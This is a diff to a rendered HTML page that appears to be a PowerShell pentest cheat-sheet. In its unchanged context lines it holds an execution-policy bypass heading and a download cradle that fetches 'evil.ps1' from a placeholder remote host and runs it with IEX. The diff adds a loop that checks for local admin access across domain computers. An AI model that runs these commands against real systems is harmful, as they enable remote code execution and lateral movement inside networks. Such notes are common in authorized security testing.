@@ -140,7 +140,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#common" title="Common">Common</a></li><li><a class="toc-href" href="#remote-file" title="Remote File">Remote File</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#common" title="Common">Common</a></li><li><a class="toc-href" href="#remote-file" title="Remote File">Remote File</a></li><li><a class="toc-href" href="#loop" title="Loop">Loop</a></li></ul></div>
         </div>
     <h2 id="common">Common</h2>
 <p>PowerShell Execution Policy bypass:</p>
@@ -176,6 +176,10 @@
 <span class="nv">$wr</span> <span class="p">=</span> <span class="no">[System.NET.WebRequest]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s2">"http://&lt;remote&gt;/evil.ps1"</span><span class="p">)</span>
 <span class="nv">$r</span> <span class="p">=</span> <span class="nv">$wr</span><span class="p">.</span><span class="n">GetResponse</span><span class="p">()</span>
 <span class="nb">IEX </span><span class="p">(</span><span class="no">[System.IO.StreamReader]</span><span class="p">(</span><span class="nv">$r</span><span class="p">.</span><span class="n">GetResponseStream</span><span class="p">())).</span><span class="n">ReadToEnd</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="loop">Loop</h2>
+<p>Loop on object:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-NetComputer</span> <span class="p">|</span> <span class="nb">select </span><span class="n">dnshostname</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="n">-Process</span> <span class="p">{</span><span class="nb">Invoke-CheckLocalAdminAccess</span> <span class="n">-ComputerName</span> <span class="nv">$_</span><span class="p">.</span><span class="n">dnshostname</span> <span class="n">-Verbose</span><span class="p">}</span>
 </code></pre></div>
   </div>
   <div class="tag-cloud">
